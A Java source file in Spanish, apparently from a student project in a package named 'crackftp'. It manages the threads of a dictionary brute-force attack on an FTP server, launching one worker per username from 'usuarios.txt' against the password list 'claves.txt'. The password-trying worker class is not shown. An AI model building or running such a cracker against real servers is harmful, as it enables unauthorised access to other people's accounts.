/*
Esta es la clase que gestionará los hilos 
*/
package crackftp;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author ubuntuvirtual
 */
public class GestorHilos {
    private String direccion;
    private String puerto;
    private int hilos;
    private int contadorHilos;
    
    public GestorHilos(String d, String p, int hilos){
        this.direccion = d;
        this.puerto = p;
        this.hilos = hilos;
        this.contadorHilos = 0;
    }
    
    //Este método inicia el crackeo con los diferentes hilos. Inicialmente implementamos el metodo para un unico hilo
    public void iniciarCrack(){
        BufferedReader br = null;
        
        boolean ficheroTerminado = false;
        try {
            //fichero de usuarios
            br = new BufferedReader(new FileReader("usuarios.txt"));
            
            //Creamos los hilos que ejecutan las conexiones y comprobaciones de diccionario
            while(this.contadorHilos <= this.hilos){
                String usuario = br.readLine();
                if(usuario == null){
                    break;
                }
            bloquearHilos();
            incrementarContador();            
            
            //Se crea un nuevo hilo con los datos apropiados y lo lanzamos
            Thread t = new Thread(new Hilo(usuario, "claves.txt", this.direccion, this.puerto,this));
            t.start();
            }
        } catch (FileNotFoundException ex) {
            System.out.println("El fichero no se ha encontrado");
        }catch (IOException ex) {
            Logger.getLogger(GestorHilos.class.getName()).log(Level.SEVERE, null, ex);
        }finally{
            //Cerramos el fichero para leer el usuario.
            if(br != null){
                try {
                    br.close();
                } catch (IOException ex) {
                    Logger.getLogger(GestorHilos.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
    }
    
    //Metodo para incrementar el contador de los hilos en ejecución
    public synchronized void incrementarContador(){
        this.contadorHilos ++;
    }
    
    //Metodo para disminuir en contador de los hilos en ejecución
    public synchronized  void decrementarContador(){
        this.contadorHilos --;
    }
    
    //Metodo para desbloquear el bucle que genera hilos
    public synchronized void desbloquearHilos(){
        this.notifyAll();
    }
    
    //Metodo para bloquear la creación de hilos
    public synchronized void bloquearHilos(){
        while(this.contadorHilos == this.hilos){
            try {
                System.out.println("Esperando a que termine uno de los hilos en ejecucion termine");
                this.wait();
            } catch (InterruptedException ex) {
                Logger.getLogger(GestorHilos.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}
